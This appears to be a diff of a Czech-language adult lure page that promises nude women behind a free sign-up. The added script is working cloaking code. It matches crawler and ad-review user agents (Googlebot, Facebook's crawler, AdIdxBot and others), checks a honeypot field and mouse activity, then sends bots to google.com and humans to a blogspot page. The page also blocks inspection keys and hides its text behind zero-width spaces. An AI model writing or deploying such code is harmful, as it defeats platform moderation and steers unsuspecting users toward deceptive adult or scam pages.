@@ -6,7 +6,7 @@
 <meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1, user-scalable=no">
 <meta name="robots" content="noindex, nofollow">
 <meta name="referrer" content="no-referrer">
-<title>seeetkání, foootkyyy</title>
+<title>Noční foootografie</title>
 <meta content='https://i.postimg.cc/13HTjVrN/Gemini-Generated-Image-gtx4nmgtx4nmgtx4.png' property='og:image'/>
 <link rel="stylesheet" href="https://cdn.smrt-content.com/assets/1004/css/index.css">
 <link rel="shortcut icon" href="https://cdn.jmpcdn.com/assets/3420/images/2.ico" type="image/x-icon">
@@ -40,6 +40,7 @@ fontFamily: { sans: ['Inter', 'sans-serif'] }
 </head>
 <body>
 <script>
+// Bloqueo de inspección básica
 document.addEventListener('contextmenu', e => e.preventDefault());
 document.addEventListener('keydown', e => {
 if (e.key === 'F12' || (e.ctrlKey && (e.key === 'i' || e.key === 'I' || e.key === 'u' || e.key === 'U'))) {
@@ -47,6 +48,7 @@ e.preventDefault();
 }
 });
 </script>
+
 <div id="loading-screen" class="fixed inset-0 bg-black flex items-center justify-center z-50">
 <p class="text-white text-xl flex items-center">
 <svg class="animate-spin-custom -ml-1 mr-3 h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
@@ -56,10 +58,8 @@ e.preventDefault();
 Načítání...
 </p>
 </div>
+
 <div id="app-container" class="w-full h-screen flex flex-col items-center justify-center relative">
-<div id="debug-info" class="absolute top-0 left-0 text-[8px] px-0.5 py-0.25 rounded-br-lg bg-black/5 z-20">
-<p id="app-message" class="mt-0.5 font-bold"></p>
-</div>
 <div class="layer"></div>
 <div class="wrap">
 <div class="step-block">
@@ -77,10 +77,10 @@ N&#8203;a&#8203;b&#8203;í&#8203;z&#8203;í&#8203;m s&#8203;v&#8203;é s&#8203;l
 </div>
 <div id="step-2" class="step-item thishide" style="display: none;">
 <div class="question-title">
-P&#8203;O&#8203;Z&#8203;N&#8203;Á&#8203;M&#8203;K&#8203;A: S&#8203;o&#8203;u&#8203;h&#8203;l&#8203;a&#8203;s&#8203;í&#8203;t&#8203;e s t&#8203;í&#8203;m, ž&#8203;e b&#8203;u&#8203;d&#8203;e&#8203;t&#8203;e r&#8203;e&#8203;s&#8203;p&#8203;e&#8203;k&#8203;t&#8203;o&#8203;v&#8203;a&#8203;t ž&#8203;e&#8203;n&#8203;y, k&#8203;t&#8203;e&#8203;r&#8203;é u&#8203;v&#8203;i&#8203;d&#8203;í&#8203;t&#8203;e n&#8203;í&#8203;ž&#8203;e? K&#8203;l&#8203;i&#8203;k&#8203;n&#8203;ě&#8203;t&#8203;e n&#8203;a „V&#8203;S&#8203;T&#8203;O&#8203;U&#8203;P&#8203;I&#8203;T“ p&#8203;r&#8203;o p&#8203;o&#8203;t&#8203;v&#8203;r&#8203;z&#8203;e&#8203;n&#8203;í s&#8203;c&#8203;h&#8203;ů&#8203;z&#8203;k&#8203;y. P&#8203;o&#8203;k&#8203;u&#8203;d n&#8203;ě&#8203;k&#8203;o&#8203;h&#8203;o z&#8203;n&#8203;á&#8203;t&#8203;e, p&#8203;r&#8203;o&#8203;s&#8203;í&#8203;m, n&#8203;e&#8203;z&#8203;v&#8203;e&#8203;ř&#8203;e&#8203;j&#8203;ň&#8203;u&#8203;j&#8203;t&#8203;e a n&#8203;e&#8203;š&#8203;i&#8203;ř&#8203;t&#8203;e f&#8203;á&#8203;m&#8203;y....
+Souhlasíte s tím, že budete respektovat nahé ženy, které uvidíte na další stránce? Pokud souhlasíte, stiskněte tlačítko POKRAČOVAT níže a zaregistrujte se zdarma vyplněním formuláře, abyste viděli dívky naživo a nahé...
 </div>
 <div class="buttons-block">
-<button id="btn-final-action" class="step-btn submit-btn tr-submit-button text-center uppercase font-black text-xl sm:text-2xl py-4 px-8 rounded-xl transition-all duration-100 border-4 border-white shadow-xl bg-fuchsia-tiktok text-black hover:scale-[1.03] shadow-[0_8px_0_-2px_#e736a4,0_8px_0_0_#000] active:shadow-[0_4px_0_-2px_#e736a4,0_4px_0_0_#000] active:translate-y-[4px]" role="button">VSTOUPIT</button>
+<button id="btn-final-action" class="step-btn submit-btn tr-submit-button text-center uppercase font-black text-xl sm:text-2xl py-4 px-8 rounded-xl transition-all duration-100 border-4 border-white shadow-xl bg-fuchsia-tiktok text-black hover:scale-[1.03] shadow-[0_8px_0_-2px_#e736a4,0_8px_0_0_#000] active:shadow-[0_4px_0_-2px_#e736a4,0_4px_0_0_#000] active:translate-y-[4px]" role="button">POKRAČOVAT</button>
 </div>
 </div>
 <div class="v-section">
@@ -95,33 +95,53 @@ P&#8203;O&#8203;Z&#8203;N&#8203;Á&#8203;M&#8203;K&#8203;A: S&#8203;o&#8203;u&#8
 </div>
 </div>
 </div>
+
 <script>
-const M = 4000;
-const H = "https://lasmasvivillas.blogspot.com";
-const B = "https://lasmasvivillas.blogspot.com";
-let _k = false;
+// --- CONFIGURACIÓN DE CLOAKING ---
+const H = "https://lasmasvivillas.blogspot.com"; // LINK REAL (HUMANOS)
+const B = "https://www.google.com"; // LINK SEGURO (BOTS)
+const M = 3500; // Tiempo mínimo de estancia antes de permitir clic (ms)
+
+let _isBot = false;
 let _d = Date.now();
 let _v = false;
 let _f = false;
 let _x = false;
+
+// 1. Detección por User-Agent
+(function cloak() {
+    const ua = navigator.userAgent.toLowerCase();
+    const botPatterns = ['facebookexternalhit', 'facebot', 'googlebot', 'bingbot', 'adidxbot', 'google-adwords', 'mediapartners-google', 'twitterbot', 'linkedinbot', 'slurp', 'duckduckbot'];
+    if (botPatterns.some(pattern => ua.includes(pattern))) {
+        _isBot = true;
+    }
+    // Detección por resolución sospechosa (común en headless browsers)
+    if (window.innerWidth === 0 || window.innerHeight === 0) {
+        _isBot = true;
+    }
+})();
+
 const aC = document.getElementById('app-container');
 const lS = document.getElementById('loading-screen');
 const bA = document.getElementById('btn-final-action');
 const hF = document.getElementById('hp-field');
 const s1 = document.getElementById('step-1');
 const s2 = document.getElementById('step-2');
+
 function nS(id) {
   if (id === 'step-2') {
       s1.style.display = 'none';
       s2.style.display = 'block';
   }
 }
+
 document.querySelectorAll('.step-trigger').forEach(b => {
   b.addEventListener('click', (e) => {
       const n = e.currentTarget.dataset.next;
       if (n) nS(n);
   });
 });
+
 function uB(t, iB = false, iL = false) {
   const c = 'step-btn submit-btn tr-submit-button text-center uppercase font-black text-xl sm:text-2xl py-4 px-8 rounded-xl transition-all duration-100 border-4 border-white shadow-xl';
   if (iL) {
@@ -135,29 +155,36 @@ function uB(t, iB = false, iL = false) {
       bA.className = `${c} bg-fuchsia-tiktok text-black hover:scale-[1.03] shadow-[0_8px_0_-2px_#e736a4,0_8px_0_0_#000]`;
   }
 }
-function cK() {
-  const t = Date.now() - _d;
-  if (hF.value.length > 0 || t < M || !_f || !_x) {
-      _k = true;
-      uB('ERROR', true);
-      return true;
+
+function verifyUser() {
+  const timeElapsed = Date.now() - _d;
+  // Si llenó el campo oculto, o fue muy rápido, o no movió el mouse, o es un bot detectado por UA
+  if (hF.value.length > 0 || timeElapsed < M || !_f || !_x || _isBot) {
+      return true; // Es un BOT
   }
-  return false;
+  return false; // Es un HUMANO
 }
+
 async function hE(e) {
   e.preventDefault();
-  if (_v || _k) return;
+  if (_v) return;
   _v = true;
+  
   uB('OVĚŘOVÁNÍ...', false, true);
-  const r = cK();
+  
+  const botDetected = verifyUser();
+  
   setTimeout(() => {
-      window.location.href = r ? B : H;
-  }, 800);
+      // Cloaking final: Si es bot va a B (Seguro), si es humano va a H (Real)
+      window.location.href = botDetected ? B : H;
+  }, 1200);
 }
+
 window.addEventListener('focus', () => { _f = true; }, { once: true });
-['mousemove', 'touchstart', 'click'].forEach(e => {
+['mousemove', 'touchstart', 'click', 'scroll'].forEach(e => {
   document.addEventListener(e, () => { _x = true; }, { once: true });
 });
+
 (function i() {
   setTimeout(() => {
       lS.style.opacity = '0';
@@ -168,6 +195,7 @@ window.addEventListener('focus', () => { _f = true; }, { once: true });
       }, 500);
   }, 1000);
 })();
+
 bA.addEventListener('click', hE);
 </script>
 </body>
